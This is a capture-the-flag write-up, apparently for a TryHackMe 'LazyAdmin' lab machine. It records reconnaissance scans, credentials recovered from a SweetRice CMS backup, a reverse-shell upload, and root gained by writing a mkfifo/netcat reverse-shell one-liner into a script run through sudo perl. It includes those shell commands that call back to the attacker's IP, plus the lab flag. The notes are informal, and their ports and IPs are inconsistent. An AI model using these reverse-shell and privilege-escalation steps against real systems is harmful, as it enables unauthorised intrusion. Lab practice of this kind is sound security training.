# Reconnaissance

```
Nmap 7.93 scan initiated Thu Jan 12 23:21:31 2023 as: nmap -sV -A -p 80,22 -vvv -oN README.md 10.10.168.148

Nmap scan report for 10.10.168.148
Host is up, received echo-reply ttl 63 (0.21s latency).
Scanned at 2023-01-12 23:21:38 EST for 25s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 497cf741104373da2ce6389586f8e0f0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCo0a0DBybd2oCUPGjhXN1BQrAhbKKJhN/PW2OCccDm6KB/+sH/2UWHy3kE1XDgWO2W3EEHVd6vf7SdrCt7sWhJSno/q1ICO6ZnHBCjyWcRMxojBvVtS4kOlzungcirIpPDxiDChZoy+ZdlC3hgnzS5ih/RstPbIy0uG7QI/K7wFzW7dqMlYw62CupjNHt/O16DlokjkzSdq9eyYwzef/CDRb5QnpkTX5iQcxyKiPzZVdX/W8pfP3VfLyd/cxBqvbtQcl3iT1n+QwL8+QArh01boMgWs6oIDxvPxvXoJ0Ts0pEQ2BFC9u7CgdvQz1p+VtuxdH6mu9YztRymXmXPKJfB
|   256 2fd7c44ce81b5a9044dfc0638c72ae55 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC8TzxsGQ1Xtyg+XwisNmDmdsHKumQYqiUbxqVd+E0E0TdRaeIkSGov/GKoXY00EX2izJSImiJtn0j988XBOTFE=
|   256 61846227c6c32917dd27459e29cb905e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILe/TbqqjC/bQMfBM29kV2xApQbhUXLFwFJPU14Y9/Nm
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.10 - 3.13 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.93%E=4%D=1/12%OT=22%CT=%CU=30378%PV=Y%DS=2%DC=T%G=N%TM=63C0DC6B%P=x86_64-pc-linux-gnu)
SEQ(SP=103%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M506ST11NW6%O2=M506ST11NW6%O3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST11NW6%O6=M506ST11)
WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)
ECN(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW6%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 21.161 days (since Thu Dec 22 19:30:34 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   214.90 ms 10.18.0.1
2   214.95 ms 10.10.168.148

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jan 12 23:22:03 2023 -- 1 IP address (1 host up) scanned in 33.16 seconds
```

### Directory Busting
```
feroxbuster -u http://10.10.31.94 -v -e

$ip/content/as
[>-------------------] - 1m     13520/330141  24m     found:33      errors:1455   
[#>------------------] - 1m      2036/30000   32/s    http://10.10.31.94/ 
[##>-----------------] - 1m      3016/30000   50/s    http://10.10.31.94/icons/ 
[#>------------------] - 59s     2890/30000   48/s    http://10.10.31.94/content/ 
[>-------------------] - 56s      970/30000   17/s    http://10.10.31.94/content/js/ 
[#>------------------] - 55s     1832/30000   32/s    http://10.10.31.94/content/inc/ 
[####################] - 15s    30000/30000   0/s     http://10.10.31.94/content/images/ => Directory listing
[>-------------------] - 51s     1301/30000   25/s    http://10.10.31.94/content/_themes/ 
[>-------------------] - 46s      627/30000   13/s    http://10.10.31.94/content/attachment/ 
[>-------------------] - 39s      565/30000   14/s    http://10.10.31.94/content/inc/lang/ 
[####################] - 28s    30000/30000   0/s     http://10.10.31.94/content/inc/font/ => Directory listing
[>-------------------] - 31s      211/30000   6/s     http://10.10.31.94/content/as/ 
[--------------------] - 0s         0/30000   0/s     http://10.10.31.94/content/_themes/default/ 
[--------------------] - 0s         0/30000   0/s     http://10.10.31.94/content/as/lib/ 
```


once I am able to log in to the webserver, I go to ads page and upload a reverse shell

### upon getting the backup sql, and inspecting i am able to get admin and password
```
cat mysql_bakup_20191129023059-1.5.1.sql | grep -ir pass
mysql_bakup_20191129023059-1.5.1.sql:  14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
```
### inside the 10.10.31.94/content directory I was able to get this credentials
user: manager
pass: Password123

### i used searchploit to get the sweetrice exploit

```
┌──(aaron㉿kali)-[~/thm/lazyadmin]
└─$ nc -l -v -p 4433
listening on [any] 4433 ...
10.10.31.94: inverse host lookup failed: Unknown host
connect to [10.18.70.19] from (UNKNOWN) [10.10.31.94] 58546
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 08:13:10 up 13 min,  0 users,  load average: 0.06, 1.94, 2.42
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.70.19 444 >/tmp/f" > /etc/copy.sh
```

└─$ nc -lnvp 4444   
listening on [any] 4444 ...
connect to [10.18.70.19] from (UNKNOWN) [10.10.129.83] 40224
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 04:02:02 up 11 min,  0 users,  load average: 0.24, 0.66, 0.69
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bin/sh -i 2>&1|nc 10.18.70.19 5554 >/tmp/f
$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.70.19 5554 > /tmp/f" > /etc/copy.sh
$ sudo /usr/bin/perl /home/itguy/backup.pl

# I created another listening port and upon running I am successfully become root
```
┌──(aaron㉿kali)-[~/thm/lazyadmin]
└─$ nc -lnvp 5554
listening on [any] 5554 ...
connect to [10.18.70.19] from (UNKNOWN) [10.10.129.83] 35054
/bin/sh: 0: can't access tty; job control turned off
whoami
root
 cd /
ls
bin
boot
cdrom

var
vmlinuz
vmlinuz.old
# cd /root
# ls
root.txt
# cat root/txt  
cat: root/txt: No such file or directory
# cat root.txt
THM{6637f41d0177b6f37cb20d775124699f}
# 
```
